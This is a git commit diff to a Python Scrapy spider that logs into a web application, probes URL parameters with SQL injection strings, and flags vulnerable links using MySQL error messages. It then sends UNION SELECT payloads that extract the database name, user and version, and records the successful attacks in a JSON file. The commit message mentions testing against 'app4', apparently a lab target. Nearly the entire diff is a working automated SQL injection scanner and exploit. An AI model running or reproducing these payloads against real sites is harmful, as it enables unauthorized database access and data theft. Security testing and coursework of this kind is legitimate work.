b9aeb3db80659ad5c69cef4f78ac27ddec7c954c
dchhatani <deepakjch@gmail.com>
2015-04-17 00:55:46 +0800

    Changes to include actual payloads: tested for app4

--- dirbot-master/dirbot/spiders/step3.py
+++ dirbot-master/dirbot/spiders/step3.py
@@ -18,12 +18,19 @@ import json
 error_payloads = ["+and+SLAP(10)+--+",
 					"'kasdgh",
 					"+AND+SEELCT"]
-links = open('linksToAttack.txt','r')
+actual_payloads = ["%27+and+1=2+union+select+1,2,database%28%29,user%28%29,5,6,version%28%29,8,9,10,11,12+--+%20%3E%3E%2",
+"%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5+--+",
+"%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29+--+"]
+
+links = open('links.txt','r')
 urls = links.readlines()
 links.close()
 items = []
 fin = []
 dic = {}
+tempResponse = ""
+searchterms = ["mysql error","sql syntax", "mysql server version", "unknown column","access violation","SQLSTATE", 
+ "different number of columns","Cardinality violation"]
 
 class step3(Spider):
 	name = "step3"
@@ -39,9 +46,9 @@ class step3(Spider):
 		args, url, method = fill_login_form(self.start_urls[0], response.body, self.login_user[0], self.login_pass[0])
 		print args
 		
-		for x in query_string.split('&'):
-			y = x.split('=')
-			self.params.append((y[0], y[1]))
+		#for x in query_string.split('&'):
+			#y = x.split('=')
+			#self.params.append((y[0], y[1]))
 		
 		return FormRequest(url, method=method, formdata=args, callback=self.after_login)
 
@@ -84,11 +91,12 @@ class step3(Spider):
 		#print "Response: " + response.url
 		file = open("original_response.html", "w")
 		file.write(response.body)
+		original = response.body
 		file.close()
 		for error in error_payloads:
 				attack_with_payload = temp+error
 				newfile.write(attack_with_payload+"\n")
-				yield Request(attack_with_payload, meta={'temp':temp}, callback=self.save_attack_resp)
+				yield Request(attack_with_payload, meta={'temp':temp,'original':original}, callback=self.save_attack_resp)
 				if "&" in temp:
 						queryVals = temp.split('&')
 						length = len(queryVals)
@@ -102,8 +110,7 @@ class step3(Spider):
 										else:
 												finLink += "&"+dupVals[i]
 								newfile.write(finLink+"\n")
-								yield Request(finLink, meta={'temp':temp}, callback=self.save_attack_resp)
-				print "Did you see this"
+								yield Request(finLink, meta={'temp':temp,'original':original}, callback=self.save_attack_resp)
 		newfile.close()
 		return 
 
@@ -112,27 +119,52 @@ class step3(Spider):
 		file.write(response.body)
 		file.close()
 		temp = response.request.meta['temp']
-
-		searchterms = ["mysql error","sql syntax", "mysql server version", "unknown column", "fatal error", "stack trace"]
+		original = response.request.meta['original']
 		#if searchterms in response.body:
 		if any(term in response.body.lower() for term in searchterms):
 			self.log("\tVulnerable link: " + response.url, level=log.INFO)
+			#This link is vulnerable lets do the actual attack
 			if (temp not in items):
 					items.append(temp)
-					file2 = open("vulnerableinks.txt","a")
+					#UnionAndSelectAttacks
+					attackLink1 = temp+actual_payloads[0]
+					yield Request(attackLink1, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
+					attackLink2 = temp+actual_payloads[1]
+					yield Request(attackLink2, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
+					attackLink3 = temp+actual_payloads[2]
+					yield Request(attackLink3, meta={'temp':temp, 'original':original}, callback=self.actual_attack_resp)
+					file2 = open("vulnerableinks.txt","w")
 					file2.write(temp+"\n")
 					file2.close()
-					dic1 ={}
-					dic1["method"] = "" #Pending
-					dic1["LoginRequired"] = "" #Pending
-					dic1["username"] = self.login_user[0]
-					dic1["password"] = self.login_pass[0]
-					#OtherParameterToWrite #Pending
-					dic[response.url] = [dic1]
-		return None
+		return
+
+	def actual_attack_resp(self, response):
+		file = open("actual_attack_response.html", "a")
+		file.write(response.body)
+		file.close()
+		attackResponse = response.body
+		original = response.request.meta['original']
+		file4 = open("justToCheck.txt","a")
+		file4.write(response.url)
+		file4.close()
+		print "#############################################"
+		if not attackResponse == original:
+			if not any(term in response.body.lower() for term in searchterms):
+				file4 = open("actualAttacks.txt","a")
+				file4.write(response.url+"\n")
+				file4.close()
+				dic1 ={}
+				dic1["method"] = "GET" #Pending
+				dic1["LoginRequired"] = "true" #Pending
+				dic1["username"] = self.login_user[0]
+				dic1["password"] = self.login_pass[0]
+				#OtherParameterToWrite #Pending
+				dic[response.url] = [dic1]
+		temp = response.request.meta['temp']
+		return
 
 	def spider_closed(self, spider):
 		fin.append(dic)
-		f = open("step3outputWithFakeAttacks.json", 'w')
+		f = open("attack.json", 'w')
 		f.write(json.dumps(fin,indent= 4, sort_keys = True))
 		f.close()
